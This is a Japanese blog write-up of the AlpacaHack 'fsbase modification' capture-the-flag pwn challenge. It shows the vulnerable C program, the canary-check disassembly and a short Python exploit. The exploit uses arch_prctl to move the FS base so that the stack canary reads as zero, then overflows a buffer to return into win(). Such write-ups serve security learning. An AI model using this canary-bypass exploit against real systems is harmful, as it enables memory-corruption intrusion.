---
title: Daily AlpacaHack fsbase modification Writeup
author: Ojun
slug: fsbase-modification
featured: true
draft: false
pubDatetime: 2026-10-10T21:00:00.000Z
description: fsbase modificationのwriteup
tags:
  - tech
  - ctf
  - pwn
ogImage: "@/assets/images/2026/fsbase-modification.png"
---

おはようございます。AI slopperです。
日々、slopperの自覚があるので、AlpacaHackの問題を解くときはAIを使わないことにしています。
もちろんこのブログの文章を書くときも、そうしています。

現在朝の4時58分なのですが、外を見てみるとまだ暗いので、秋になったなあと感じます。
大学のタスクに追われたり、仕事のタスクに追われたり、サークル運営（こちらはコミットできているか怪しいです。すみません...）に追われたりしています。

## 概要

![問題概要の画像](@/assets/images/2026/fsbase-modification.png)

ソースコードを以下に示します。

```c
// gcc -o chal chal.c -no-pie
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/syscall.h>
#include <asm/prctl.h>

void __attribute__((__used__)) win(void) {
    char *argv[] = {"/bin/cat", "/flag.txt", NULL};
    syscall(SYS_execve, argv[0], argv, NULL);
}

void vuln(void) {
    char buf[8] = {0};
    write(STDOUT_FILENO, "Please leave a message> ", 24);
    read(STDIN_FILENO, buf, 32);
}

int main(void) {
    write(STDOUT_FILENO, "fsbase(-1 for testing a default vuln behavior): ", 48);
    char buf[32] = {0};
    read(STDIN_FILENO, buf, sizeof(buf) - 1);
    unsigned long fsbase = strtoul(buf, NULL, 10);

    int result = syscall(SYS_arch_prctl, ARCH_SET_FS, fsbase);
    if (result < 0) {
        write(STDOUT_FILENO, "arch_prctl failed.\n", 19);
    }

    vuln();
}
```

`win`関数を呼べればよいです。`vuln`関数で自明にBOFができますが、stack canaryが有効なので、stack BOFをするとプログラムが強制終了します。そこで、`main`関数で`fsbase`という値が調整できるようになっています。

短いので先に解き方から簡潔に説明します。

## 攻撃

### stack canaryの説明

`vuln`関数の後半について、disassembleすると以下のような命令があります。

```asm
   0x0000000000401278 <+83>:	mov    rax,QWORD PTR [rbp-0x8]
   0x000000000040127c <+87>:	sub    rax,QWORD PTR fs:0x28
   0x0000000000401285 <+96>:	je     0x40128c <vuln+103>
   0x0000000000401287 <+98>:	call   0x401090 <__stack_chk_fail@plt>
   0x000000000040128c <+103>:	leave
   0x000000000040128d <+104>:	ret
```

`__stack_chk_fail@plt`というのが、stack BOFが検知されたときにプログラムを落とす処理ですね。ここに飛ばれないためには、ローカル変数`[rbp-0x8]`と、thread-local storage（TLS）のデータ`fs:0x28`を一致させる必要があります。

これらの値は、普通は一致します。以下に示すように、`vuln`関数の最初の部分を見ると、`[rbp-0x8]`に`fs:0x28`の値を代入しており、その後`[rbp-0x8]`を触るような処理はないからです（当然、`fs:0x28`を触るような処理もありません）。

```asm
   0x0000000000401225 <+0>:	endbr64
   0x0000000000401229 <+4>:	push   rbp
   0x000000000040122a <+5>:	mov    rbp,rsp
   0x000000000040122d <+8>:	sub    rsp,0x10
   0x0000000000401231 <+12>:	mov    rax,QWORD PTR fs:0x28
   0x000000000040123a <+21>:	mov    QWORD PTR [rbp-0x8],rax
```

`rip`レジスタ（やsaved `rbp`）が書き換えられるようなstack BOFをすると`[rbp-0x8]`が書き換えられてしまうので、値の不一致が起きてstack BOFが検知される、ということです。`fs:0x28`の値はランダムで、攻撃者からは予測できません。

### stack canaryの恣意的な変更
stack canaryをbypassする方法として、何らかの方法を用いてstack canaryをリークしてから、BOFするときに`[rbp-0x8]`が`fs:0x28`に一致するようなpayloadを送るという方法があります。

（他にも方法はありますが）もう一つの方法として`fs:0x28`を`[rbp-0x8]`と一致するように書き換えるというものがあり、今回はこの方法を用います。

あとで理由を述べますが、結論から言うと`fs:0x28`の値とは、`main`関数における`fsbase`を用いると`[fsbase + 0x28]`と表現でき、`fsbase`を書き換えることで、`fs:0x28`が参照するアドレスを書き換えられます。

例えば`fsbase`を、`fsbase + 0x28`が適当な`.data`セクションのNULバイトで初期化されているような場所に設定しておき、payloadは`[rbp-0x8]`にNULバイトが来るように構築してあげると、防御機構に引っかかりません。

PIEがないのでアドレスをリークする必要はないです。例えば以下のようなプログラムで`win`関数を呼ぶことができます。

```python
from ptrlib import *

win = 0x4011b6

io = Socket("server!! 37571")

payload = b"A"*8
payload += b"\x00"*8
payload += b"A"*8
payload += p64(win)

io.sendafter(": ", str(0x404038))
io.sendlineafter("> ", payload)
print(io.recvline().decode())
```

## FS baseについてもう少し詳しく

`FS`とはセグメントレジスタの一つです。セグメントレジスタとは、メモリ領域（segment）を指定するために使われていたレジスタです。実はこれはx86での用途で、x86-64ではセグメントレジスタの役割の多くが失われていますが、`FS`と`GS`についてはbase addressを使ったアドレス指定が残っています。

Linux x86-64のシステムでは、FS baseはthread-local storage（TLS）といったスレッド固有のデータを参照するために使われています[^1]。
TLSにstack canaryを置くことで、各スレッドから固定のoffsetで高速に参照できるので便利です。
そのFS baseを、`arch_prctl`というシステムコールで変更できるというわけです。

stack canaryは、FS baseからの相対位置に置かれています。
したがって、FS baseを変更すると、`fs:0x28`という同じアクセスでも、実際に参照されるアドレスである`fsbase + 0x28`が変わります。

[^1]: https://www.kernel.org/doc/html/v6.2/x86/x86_64/fsgs.html
